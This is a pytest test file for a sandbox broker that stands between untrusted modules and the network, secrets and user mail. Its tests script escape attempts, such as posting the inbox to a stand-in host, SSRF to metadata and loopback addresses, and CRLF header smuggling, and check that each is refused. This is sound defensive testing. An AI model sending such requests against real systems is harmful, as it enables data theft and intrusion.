"""Gate tests for the broker: a sandboxed module's one way out (06-modules.md, section 3).

The sandbox takes a module's network, secrets and the user's data away, so
everything it reaches outside it reaches through `core/sandbox/broker.py`.
A rule missing here is a hole in every wall around it: a module told by a
crafted mail to post the inbox somewhere would post it. Each escape below
is what such a module would try, and each test shows the request refused
and nothing sent. The same escapes are tried from a real sandboxed child in
test_module_broker_sandbox.py.
"""

from __future__ import annotations

import base64
import dataclasses
import datetime as dt
import io
import json

import httpx
import pytest

from core import egress
from core.modctx import TIMEOUT_S, Hosts, Network, hosts_for
from core.sandbox.broker import (
    MAX_LINE,
    MAX_LOG_LINES,
    MIN_TIMEOUT_S,
    RATE,
    Broker,
    Grants,
    Session,
    grants_for,
)
from steve_sdk.calls import MAX_ACT, MAX_ACTS
from steve_sdk.context import Account
from steve_sdk.errors import NotConnected, SignInNeeded
from steve_sdk.link import (
    BAD_PARAMS,
    FAILED,
    INVALID,
    NO_METHOD,
    PARSE,
    REFUSED,
    Broken,
    line,
)
from steve_sdk.manifest import parse
from steve_sdk.testing.context import FakeContext

PUBLIC_IP = "93.184.216.34"
SECRET = "s3cr3t-value-0042"


class FakeNetwork(Network):
    """The outside: every name public unless `answers` says otherwise, and
    every request answered by `handler` and kept in `seen`."""

    def __init__(self, answers=None, handler=None):
        self.answers = answers or {}
        self.seen: list[httpx.Request] = []
        self._handler = handler or (lambda request: httpx.Response(200, text="ok"))

    def resolve(self, host, port):
        return self.answers.get(host, [PUBLIC_IP])

    def own_ports(self):
        return {54321}

    def transport_for(self, host):
        def handle(request):
            self.seen.append(request)
            return self._handler(request)

        return httpx.MockTransport(handle)


class Clock:
    def __init__(self):
        self.now = 1000.0

    def __call__(self):
        return self.now


def _manifest():
    return parse({
        "manifest_version": 1, "sdk": 1, "id": "webby", "label": "Webby", "for": "Tests",
        "classes": ["calendar"],
        "calendar": {"engine": "caldav", "url": "https://dav.webby.example/{address}/"},
        "hosts": ["api.webby.example", "*.cdn.webby.example"],
        "methods": {"api.webby.example": ["GET", "POST"]},
        "reads": ["mail"],
        "setup": {"steps": ["fields", "test"], "fields": [
            {"name": "token", "type": "secret",
             "bind": {"host": "api.webby.example", "header": "Authorization",
                      "form": "Bearer {}"}},
            {"name": "other", "type": "secret"}]},
    })


def _broker(net, *, reader=None, kept=None, rate=RATE, clock=None):
    account = Account(key="acct0001", name="Mine", module="webby")
    secrets = {"token": SECRET, "other": "another-value-77"}
    return Broker(module="webby", grants=grants_for(_manifest(), account), secret=secrets.get,
                  network=net, redact=lambda text: text.replace("555-0100", "<PHONE>"),
                  keep=(kept if kept is not None else []).append, reader=reader, rate=rate,
                  clock=clock or Clock())


def _call(broker, method, params, ident=1):
    return json.loads(broker.handle(line({"jsonrpc": "2.0", "id": ident, "method": method,
                                          "params": params})))


def _fetch(broker, url, **params):
    return _call(broker, "http.fetch", {"url": url, **params})


def _code(reply):
    return reply.get("error", {}).get("code")


# --- the escapes ---------------------------------------------------------------

def test_a_host_the_grants_do_not_hold_is_refused_and_never_reached():
    """The plainest way out: post what it read to a host of its own."""
    net = FakeNetwork()
    reply = _fetch(_broker(net), "https://collect.example/inbox", method="POST",
                   content=base64.b64encode(b"the inbox").decode())
    assert _code(reply) == REFUSED
    assert "collect.example is not among the hosts" in reply["error"]["message"]
    assert net.seen == []


def test_a_redirect_to_a_host_off_the_list_is_refused_at_that_hop():
    """A declared host that answers with a redirect would otherwise carry
    the request anywhere: each hop is checked again, as a new request."""
    net = FakeNetwork(handler=lambda request: httpx.Response(
        302, headers={"Location": "https://collect.example/x"}))
    reply = _fetch(_broker(net), "https://api.webby.example/away", follow=True)
    assert _code(reply) == REFUSED
    assert "collect.example" in reply["error"]["message"]
    assert [str(r.url.host) for r in net.seen] == ["api.webby.example"]


def test_a_secret_never_follows_a_redirect_to_another_host():
    """A key is bound to one host, port and header. A redirect to another
    host the module may reach still must not carry it there."""
    def handler(request):
        if request.url.host == "api.webby.example":
            return httpx.Response(302, headers={"Location": "https://p1.cdn.webby.example/x"})
        return httpx.Response(200, text="landed")

    net = FakeNetwork(handler=handler)
    reply = _fetch(_broker(net), "https://api.webby.example/hop", follow=True,
                   headers={"Authorization": "{{secret:token}}"})
    assert reply["result"]["status"] == 200
    first, second = net.seen
    assert first.headers["Authorization"] == f"Bearer {SECRET}"
    assert second.url.host == "p1.cdn.webby.example"
    assert "authorization" not in second.headers
    assert SECRET not in str(second.headers.raw)


def test_a_declared_host_whose_name_now_points_inside_is_refused():
    """DNS is the attacker's: a name approved as public can be pointed at
    the router, the cloud's metadata address, or this computer later."""
    for address in ("10.0.0.5", "169.254.169.254", "127.0.0.1", "::1"):
        net = FakeNetwork({"p9.cdn.webby.example": [address]})
        reply = _fetch(_broker(net), "https://p9.cdn.webby.example/")
        assert _code(reply) == REFUSED, address
        assert net.seen == []


def test_a_header_that_could_steer_the_request_or_split_it_is_refused():
    """`Host` and the forwarding headers can route a request past a proxy's
    checks to somewhere else; a line break in a value writes a header of
    the module's own choosing, or a second request."""
    net = FakeNetwork()
    broker = _broker(net)
    for headers in ({"Host": "collect.example"}, {"X-Forwarded-For": "127.0.0.1"},
                    {"x-forwarded-host": "collect.example"}, {"Forwarded": "for=10.0.0.1"},
                    {"X-Original-URL": "/admin"}, {"Connection": "close"},
                    {"Transfer-Encoding": "chunked"},
                    {"X-Note": "a\r\nAuthorization: Bearer stolen"},
                    {"Bad Name": "x"}):
        assert _code(_fetch(broker, "https://api.webby.example/", headers=headers)) == REFUSED, \
            headers
    assert _code(_fetch(broker, "https://api.webby.example/",
                        headers={"X-Note": "café"})) == BAD_PARAMS
    assert net.seen == []


def test_a_secret_is_filled_only_where_it_is_bound_and_one_not_declared_never():
    """The module names a secret; the broker fills it only into the header,
    host and port it is bound to. Named anywhere else -- another header,
    another host, a secret bound nowhere, or one the manifest never
    declared -- the request is refused, not sent with the name in it."""
    net = FakeNetwork()
    broker = _broker(net)
    for url, header, name in (
            ("https://api.webby.example/", "X-Token", "token"),
            ("https://p1.cdn.webby.example/", "Authorization", "token"),
            ("https://api.webby.example:8443/", "Authorization", "token"),
            ("https://api.webby.example/", "Authorization", "other"),
            ("https://api.webby.example/", "Authorization", "openai_api_key")):
        reply = _fetch(broker, url, headers={header: "{{secret:" + name + "}}"})
        assert _code(reply) == REFUSED, (url, header, name)
    assert net.seen == []
    assert _fetch(broker, "https://api.webby.example/me",
                  headers={"Authorization": "{{secret:token}}"})["result"]["status"] == 200
    assert net.seen[-1].headers["Authorization"] == f"Bearer {SECRET}"


def test_a_method_the_manifest_does_not_declare_for_a_host_is_refused_at_every_hop():
    """A host declared for reading is reached with GET and HEAD alone,
    which is what lets core call such a module a reader. A 307 keeps the
    method across a redirect, so the check is made again at each hop."""
    net = FakeNetwork(handler=lambda request: httpx.Response(
        307, headers={"Location": "https://p1.cdn.webby.example/drop"}))
    broker = _broker(net)
    assert _code(_fetch(broker, "https://api.webby.example/", method="DELETE")) == REFUSED
    assert _code(_fetch(broker, "https://p1.cdn.webby.example/", method="POST")) == REFUSED
    assert net.seen == []
    reply = _fetch(broker, "https://api.webby.example/", method="POST", follow=True)
    assert _code(reply) == REFUSED
    assert "POST to p1.cdn.webby.example" in reply["error"]["message"]
    assert [r.url.host for r in net.seen] == ["api.webby.example"]


def test_plain_http_is_refused_even_to_a_host_the_grants_hold():
    net = FakeNetwork()
    assert _code(_fetch(_broker(net), "http://api.webby.example/")) == REFUSED
    assert net.seen == []


def test_the_grants_never_hold_this_computer():
    """A mail bridge the user runs here is reached by core's IMAP engine,
    in the backend. Through the broker, a module would reach whatever
    else listens on this computer, the personal edition's agent among it."""
    manifest = parse({
        "manifest_version": 1, "sdk": 1, "id": "bridge", "label": "Bridge", "for": "Tests",
        "classes": ["mail"],
        "mail": {"engine": "imap", "imap": "imap.webby.example:993",
                 "smtp": "smtp.webby.example:465", "sent_copy": "server"},
        "setup": {"steps": ["fields", "test"],
                  "fields": [{"name": "app_password", "type": "secret"}]},
    })
    account = Account(key="acct0001", name="Bridge", module="bridge", fields={
        "hosts": {"127.0.0.1": egress.LOOPBACK, "nas.home.example": egress.PRIVATE}})
    assert hosts_for(manifest, account).kind("127.0.0.1") == egress.LOOPBACK
    held = grants_for(manifest, account).hosts
    assert held.kind("127.0.0.1") is None
    assert held.kind("nas.home.example") == egress.PRIVATE
    assert held.kind("imap.webby.example") == egress.PUBLIC


def test_plain_http_is_refused_even_to_this_computer_were_it_granted():
    """A built-in's engine may speak plain HTTP to this computer; code in
    the sandbox never does, whatever its grants say."""
    net = FakeNetwork()
    grants = Grants(hosts=Hosts(typed={"127.0.0.1": egress.LOOPBACK}),
                    methods=lambda host: ("GET",), bindings={}, secrets=())
    broker = Broker(module="webby", grants=grants, secret=lambda name: None, network=net,
                    redact=str, keep=[].append)
    reply = _fetch(broker, "http://127.0.0.1:8080/")
    assert _code(reply) == REFUSED and "HTTPS only" in reply["error"]["message"]
    assert net.seen == []


def test_a_secret_bound_but_not_granted_is_never_filled():
    """The user may approve fewer secrets than a manifest binds; a binding
    alone must not fill one."""
    account = Account(key="acct0001", name="Mine", module="webby")
    grants = dataclasses.replace(grants_for(_manifest(), account), secrets=())
    net = FakeNetwork()
    broker = Broker(module="webby", grants=grants, secret={"token": SECRET}.get, network=net,
                    redact=str, keep=[].append)
    reply = _fetch(broker, "https://api.webby.example/",
                   headers={"Authorization": "{{secret:token}}"})
    assert _code(reply) == REFUSED
    assert net.seen == []


def test_a_server_that_echoes_a_filled_secret_does_not_hand_it_to_the_module():
    """The module never holds a secret, so it cannot send one elsewhere. A
    server echoing the request back (an error page, a debug endpoint)
    would hand it over, and the module could post it to another host."""
    def echo(request):
        said = request.headers.get("Authorization", "")
        return httpx.Response(401, headers={"X-Echo": said}, text=f"bad key: {said}")

    reply = _fetch(_broker(FakeNetwork(handler=echo)), "https://api.webby.example/me",
                   headers={"Authorization": "{{secret:token}}"})["result"]
    body = base64.b64decode(reply["content"]).decode()
    assert SECRET not in body and SECRET not in json.dumps(reply)
    assert body == "bad key: Bearer [secret]"
    assert reply["headers"]["x-echo"] == "Bearer [secret]"


# --- the caps ------------------------------------------------------------------

def test_requests_past_the_rate_cap_wait_for_the_window_to_pass():
    clock = Clock()
    net = FakeNetwork()
    broker = _broker(net, rate=(3, 60.0), clock=clock)
    for _ in range(3):
        assert _fetch(broker, "https://api.webby.example/")["result"]["status"] == 200
    reply = _fetch(broker, "https://api.webby.example/")
    assert _code(reply) == FAILED and reply["error"]["data"] == {"kind": "transient"}
    assert len(net.seen) == 3
    clock.now += 61
    assert _fetch(broker, "https://api.webby.example/")["result"]["status"] == 200


def test_a_timeout_the_module_asks_for_is_held_within_the_brokers_bounds():
    """A module could hold a connection open for as long as it liked, or
    ask for no time at all and call every slow answer a failure."""
    net = FakeNetwork()
    broker = _broker(net)
    for asked, held in ((3600, TIMEOUT_S), (0.001, MIN_TIMEOUT_S), (5, 5.0)):
        _fetch(broker, "https://api.webby.example/", timeout=asked)
        assert net.seen[-1].extensions["timeout"]["read"] == held


def test_a_body_goes_out_whole_and_the_answer_comes_back_whole():
    payload = bytes(range(256)) * 4
    net = FakeNetwork(handler=lambda request: httpx.Response(
        201, headers={"Content-Type": "application/octet-stream"}, content=request.content[::-1]))
    reply = _fetch(_broker(net), "https://api.webby.example/up", method="post",
                   content=base64.b64encode(payload).decode())["result"]
    assert net.seen[0].method == "POST" and net.seen[0].content == payload
    assert reply["status"] == 201
    assert reply["headers"]["content-type"] == "application/octet-stream"
    assert base64.b64decode(reply["content"]) == payload[::-1]


# --- the protocol ----------------------------------------------------------------

@pytest.mark.parametrize("raw, code", [
    (b"not json", PARSE),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "log", "params": {"text": NaN}}', PARSE),
    (b"[" * 100_000 + b"]" * 100_000, PARSE),
    (b'{"jsonrpc": "2.0", "id": ' + b"9" * 5000 + b', "method": "log"}', PARSE),
    (b'[{"jsonrpc": "2.0", "id": 1, "method": "log", "params": {"text": "x"}}]', INVALID),
    (b'{"id": 1, "method": "log", "params": {"text": "x"}}', INVALID),
    (b'{"jsonrpc": "2.0", "id": true, "method": "log", "params": {"text": "x"}}', INVALID),
    (b'{"jsonrpc": "2.0", "id": 1.5, "method": "log", "params": {"text": "x"}}', INVALID),
    (b'{"jsonrpc": "2.0", "id": {}, "method": "log", "params": {"text": "x"}}', INVALID),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "log", "params": ["x"]}', INVALID),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "log", "params": {"text": "x"}, "x": 1}', INVALID),
    (b'{"jsonrpc": "2.0", "id": 1, "result": 3}', INVALID),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "com.go", "params": {}}', NO_METHOD),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "com.call", "params": {}}', BAD_PARAMS),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "http.fetch", "params": {"url": 7}}', BAD_PARAMS),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "http.fetch",'
     b' "params": {"url": "https://api.webby.example/", "proxy": "x"}}', BAD_PARAMS),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "http.fetch",'
     b' "params": {"url": "https://api.webby.example/", "method": "TRACE"}}', BAD_PARAMS),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "http.fetch",'
     b' "params": {"url": "https://api.webby.example/", "content": "%%%"}}', BAD_PARAMS),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "http.fetch",'
     b' "params": {"url": "https://api.webby.example/", "timeout": true}}', BAD_PARAMS),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "http.fetch",'
     b' "params": {"url": "https://api.webby.example/", "headers": {"A": 1}}}', BAD_PARAMS),
    (b'{"jsonrpc": "2.0", "id": 1, "method": "http.fetch",'
     b' "params": {"url": "https://[::1/"}}', BAD_PARAMS),
], ids=lambda value: value[:48].decode() if isinstance(value, bytes) else str(value))
def test_a_line_that_is_not_a_call_the_broker_takes_is_answered_with_an_error_and_nothing_runs(
        raw, code):
    """The module's lines are outside input, and this is the one parser of
    them: each malformed line is answered with JSON-RPC's own error for it,
    and no request goes out on a guess."""
    net = FakeNetwork()
    kept = []
    reply = json.loads(_broker(net, kept=kept).handle(raw))
    assert reply["error"]["code"] == code
    assert net.seen == [] and kept == []


def test_a_notification_is_never_answered_even_when_it_fails():
    """A notification has no id to answer to; an answer anyway would be a
    line the module's end does not expect."""
    kept = []
    broker = _broker(FakeNetwork(), kept=kept)
    for message in ({"method": "log", "params": {"text": "hello"}},
                    {"method": "nothing.here", "params": {}},
                    {"method": "log", "params": {"text": 5}}):
        assert broker.handle(line({"jsonrpc": "2.0", **message})) is None
    assert kept == ["hello"]


# --- the log ---------------------------------------------------------------------

def test_a_log_line_is_capped_after_filled_secrets_are_replaced_and_is_redacted():
    """Cut first, a secret at the cut would leave its first part in the
    log; a module that read the user's mail would log a phone number."""
    kept = []
    broker = _broker(FakeNetwork(handler=lambda r: httpx.Response(200)), kept=kept)
    _fetch(broker, "https://api.webby.example/", headers={"Authorization": "{{secret:token}}"})
    _call(broker, "log", {"text": "x" * 490 + SECRET + " call 555-0100"})
    _call(broker, "log", {"text": "call 555-0100"})
    assert kept[0] == "x" * 490 + "[secret]" + " c"
    assert SECRET[:4] not in kept[0]
    assert kept[1] == "call <PHONE>"


def test_a_module_that_floods_its_log_is_cut_off_and_told_once():
    kept = []
    broker = _broker(FakeNetwork(), kept=kept)
    for i in range(MAX_LOG_LINES + 50):
        broker.note(f"line {i}")
    assert len(kept) == MAX_LOG_LINES + 1
    assert kept[-1] == f"(the log was cut at {MAX_LOG_LINES} lines)"


# --- reads ---------------------------------------------------------------------

class Reads:
    """A reader that keeps what it was asked and answers with one item."""

    def __init__(self, fail=None):
        self.asked = []
        self.fail = fail

    def __call__(self, klass, method, args, account):
        self.asked.append((klass, method, args, account))
        if self.fail:
            raise self.fail
        return [{"id": "mail:acct0001:bjE", "subject": "hi"}]


def _read(broker, method, args=None, klass="mail", **extra):
    return _call(broker, "connector.read", {"class": klass, "method": method,
                                            "args": args or {}, **extra})


def test_a_class_the_grants_do_not_hold_is_not_read():
    reads = Reads()
    broker = _broker(FakeNetwork(), reader=reads)
    assert _code(_read(broker, "events", klass="calendar")) == REFUSED
    assert _code(_read(broker, "search", klass="contacts")) == REFUSED
    assert reads.asked == []


def test_only_the_named_reads_are_made_and_only_with_arguments_of_their_kinds():
    """A module granted mail may search and read it, never delete or send
    it; and what it passes reaches the provider typed, never as anything
    the provider might take for another thing."""
    reads = Reads()
    broker = _broker(FakeNetwork(), reader=reads)
    assert _code(_read(broker, "delete", {"id": "x"})) == REFUSED
    assert _code(_read(broker, "send_draft")) == REFUSED
    for args in ({"label": "x"}, {"limit": "5"}, {"limit": 0}, {"limit": 101},
                 {"limit": True}, {"since": "2026-10-15T09:00:00"}, {"since": "yesterday"},
                 {"query": "x" * 2001}):
        assert _code(_read(broker, "search", args)) == BAD_PARAMS, args
    assert _code(_read(broker, "fetch")) == BAD_PARAMS
    assert reads.asked == []
    reply = _read(broker, "search", {"query": "rent", "limit": 5,
                                     "since": "2026-10-15T09:00:00+02:00"}, account="Mine")
    assert reply["result"] == [{"id": "mail:acct0001:bjE", "subject": "hi"}]
    (klass, method, args, account), = reads.asked
    assert (klass, method, account) == ("mail", "search", "Mine")
    assert args["since"] == dt.datetime(2026, 10, 15, 7, tzinfo=dt.UTC)


@pytest.mark.parametrize(("klass", "method", "args"), [
    ("calendar", "events", {}),
    ("mail", "delete", {"id": "x"}),
    ("mail", "search", {"label": "x"}),
    ("mail", "search", {"limit": 500}),
    ("mail", "search", {"limit": True}),
    ("mail", "search", {"since": "2026-10-15T09:00:00"}),
    ("mail", "search", {"query": "x" * 2001}),
    ("mail", "fetch", {}),
    ("mail", "fetch", {"id": "mail:acct0001:bjE", "body_chars": 200_000}),
], ids=["ungranted", "unmade", "unknown", "too-many", "bool", "naive", "long", "no-id",
        "too-long"])
def test_a_modules_own_tests_refuse_each_read_the_broker_refuses_in_its_words(
        klass, method, args):
    """In the self-upgrade trial (19 October 2026) a mail tool's tests gave
    it a ctx of their own that took `limit=500`, and every real call failed
    here. The SDK's `FakeContext` checks with the broker's own table, so a
    module's tests fail where its calls would, saying what Steve says."""
    reply = _read(_broker(FakeNetwork(), reader=Reads()), method, args, klass=klass)
    with pytest.raises((PermissionError, ValueError)) as raised:
        FakeContext(reads=("mail",)).read(klass, method, **args)
    if _code(reply) == REFUSED:
        assert raised.type is PermissionError
    else:
        assert (raised.type, str(raised.value)) == (ValueError, reply["error"]["message"])


def test_a_modules_own_tests_refuse_each_proposal_the_broker_refuses_in_its_words():
    broker = Broker(module="webby", grants=grants_for(_manifest()), secret=lambda name: None,
                    network=FakeNetwork(), redact=lambda text: text,
                    actor=lambda action, args: {"status": "proposed"}, clock=Clock())
    ctx = FakeContext()
    for action, args in (("Add Row", {}), ("add_row", [1]),
                         ("add_row", {"text": "x" * (MAX_ACT + 1)})):
        reply = _call(broker, "act", {"action": action, "args": args})
        with pytest.raises(ValueError) as raised:
            ctx.act(action, args)
        assert str(raised.value) == reply["error"]["message"]
    for _ in range(MAX_ACTS):
        assert "result" in _call(broker, "act", {"action": "add_row", "args": {}})
        ctx.act("add_row", {})
    assert _code(_call(broker, "act", {"action": "add_row", "args": {}})) == REFUSED
    with pytest.raises(PermissionError):
        ctx.act("add_row", {})


def test_a_read_that_fails_is_said_in_the_sdks_own_error():
    reply = _read(_broker(FakeNetwork(), reader=Reads(NotConnected("no mail account"))),
                  "search")
    assert _code(reply) == FAILED and reply["error"]["data"] == {"kind": "not_connected"}


# --- the session ---------------------------------------------------------------

class Pipes:
    """A module's process as `Session` sees it: its pipes, and whether it
    was ended."""

    def __init__(self, *lines):
        self.stdin = io.BytesIO()
        self.stdout = io.BytesIO(b"".join(lines))
        self.stderr = io.BytesIO(b"said on stderr\n")
        self.killed = False

    def kill(self):
        self.killed = True

    def close(self):
        pass


def test_core_answers_the_modules_calls_while_it_waits_for_its_own():
    """A tool core calls may fetch before it answers; core must answer it,
    and say the tool's own failure as the SDK's error."""
    net = FakeNetwork()
    kept = []
    process = Pipes(
        line({"jsonrpc": "2.0", "id": "a", "method": "http.fetch",
              "params": {"url": "https://api.webby.example/"}}),
        line({"jsonrpc": "2.0", "method": "log", "params": {"text": "fetched"}}),
        line({"jsonrpc": "2.0", "id": 1, "error": {"code": FAILED, "message": "lapsed",
                                                   "data": {"kind": "sign_in"}}}))
    session = Session(process, _broker(net, kept=kept))
    with pytest.raises(SignInNeeded, match="lapsed"):
        session.call("tool", {"q": 1})
    session.close()
    sent = [json.loads(raw) for raw in process.stdin.getvalue().splitlines()]
    assert sent[0] == {"jsonrpc": "2.0", "id": 1, "method": "tool", "params": {"q": 1}}
    assert sent[1]["id"] == "a" and sent[1]["result"]["status"] == 200
    assert len(sent) == 2
    assert sorted(kept) == ["fetched", "said on stderr"]


def test_a_line_over_the_cap_ends_the_module():
    """A module that never ends its line would have the broker hold all it
    writes; it is ended instead, before anything of it is parsed."""
    net = FakeNetwork()
    process = Pipes(b"x" * (MAX_LINE + 1) + b"\n",
                    line({"jsonrpc": "2.0", "id": 1, "method": "http.fetch",
                          "params": {"url": "https://api.webby.example/"}}))
    session = Session(process, _broker(net))
    with pytest.raises(Broken, match="over"):
        session.serve()
    assert process.killed and process.stdin.getvalue() == b"" and net.seen == []
    session.close()


def test_an_answer_to_a_call_core_did_not_make_ends_the_module():
    """Taken, a forged answer would stand for what a tool returned."""
    process = Pipes(line({"jsonrpc": "2.0", "id": 7, "result": "forged"}))
    session = Session(process, _broker(FakeNetwork()))
    with pytest.raises(Broken, match="did not make"):
        session.call("tool", {})
    assert process.killed
    session.close()


# --- a tool's call, and what it proposes -------------------------------------------

def test_outside_perform_a_call_reaches_its_hosts_with_get_and_head_alone():
    """A tool's call runs on `Grants.reading()`: a POST its manifest
    declares is refused before it leaves, so a call can look and never
    change, and every change it would make has to be proposed as a card."""
    account = Account(key="acct0001", name="Mine", module="webby")
    net = FakeNetwork()
    broker = Broker(module="webby", grants=grants_for(_manifest(), account).reading(),
                    secret=lambda name: None, network=net, redact=lambda text: text,
                    clock=Clock())
    assert _code(_fetch(broker, "https://api.webby.example/", method="POST")) == REFUSED
    assert net.seen == []
    assert _fetch(broker, "https://api.webby.example/")["result"]["status"] == 200
    assert [r.method for r in net.seen] == ["GET"]


def test_an_action_goes_only_to_core_as_proposed_and_only_a_few_from_one_call():
    """`act` hands core the action and its arguments exactly, for a card;
    with no one to hand them to (inside `perform`), it is refused. One call
    cannot bury the user in cards, or one card in arguments."""
    proposed = []

    def actor(action, args):
        proposed.append((action, args))
        return {"status": "proposed"}

    without = _broker(FakeNetwork())
    assert _code(_call(without, "act", {"action": "send", "args": {}})) == REFUSED

    broker = Broker(module="webby", grants=grants_for(_manifest()), secret=lambda name: None,
                    network=FakeNetwork(), redact=lambda text: text, actor=actor,
                    clock=Clock())
    assert _call(broker, "act", {"action": "add_row", "args": {"cells": [1, "a"]}}) == {
        "jsonrpc": "2.0", "id": 1, "result": {"status": "proposed"}}
    assert proposed == [("add_row", {"cells": [1, "a"]})]
    for bad in ({"action": "Add Row", "args": {}}, {"action": "add_row", "args": [1]},
                {"action": "add_row", "args": {"text": "x" * (MAX_ACT + 1)}},
                {"action": "add_row", "args": {}, "card": "approved"}):
        assert _code(_call(broker, "act", bad)) in (BAD_PARAMS, INVALID), bad
    for _ in range(MAX_ACTS - 1):
        assert "result" in _call(broker, "act", {"action": "add_row", "args": {}})
    assert _code(_call(broker, "act", {"action": "add_row", "args": {}})) == REFUSED
    assert len(proposed) == MAX_ACTS
